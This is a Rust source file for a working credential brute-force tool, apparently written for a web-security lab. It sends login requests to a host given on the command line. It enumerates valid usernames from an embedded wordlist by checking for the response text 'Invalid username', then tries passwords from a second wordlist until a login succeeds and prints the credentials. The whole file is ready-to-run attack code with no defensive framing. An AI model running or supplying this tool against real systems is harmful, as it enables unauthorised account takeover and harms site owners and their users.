use std::process::exit;

#[tokio::main]
async fn main() {
    let args = std::env::args().collect::<Vec<_>>();
    if args.len() != 2 {
        eprintln!("usage: {} <host>", args[0]);
        exit(1);
    }
    let host = &args[1];

    let users_wordlist = include_str!("../files/users_wordlist.txt")
        .lines()
        .collect::<Vec<_>>();
    let passwords_wordlist = include_str!("../files/passwords_wordlist.txt")
        .lines()
        .collect::<Vec<_>>();

    let url = format!("https://{}/login", host);
    let client = reqwest::Client::new();

    let mut valid_users = Vec::new();

    for &user in users_wordlist.iter() {
        let params = [("username", user), ("password", "password")];

        eprintln!("trying user: '{}'", user);
        let result = client.post(&url).form(&params).send().await.unwrap();

        if result.status() != 200 {
            eprintln!("status: {}", result.status());
            exit(1);
        }

        let body = result.text().await.unwrap();

        if !body.contains("Invalid username") {
            println!("user found: {}", user);
            valid_users.push(user);
        }
    }

    for &user in valid_users.iter() {
        for &password in passwords_wordlist.iter() {
            let params = [("username", user), ("password", password)];

            eprintln!("trying user: '{}' and password: '{}'", user, password);
            let result = client.post(&url).form(&params).send().await.unwrap();

            if result.status() != 200 {
                eprintln!("status: {}", result.status());
                exit(1);
            }

            let body = result.text().await.unwrap();

            if !body.contains("Incorrect password") {
                println!("login credentials found: {}:{}", user, password);
                exit(0);
            }
        }
    }
}
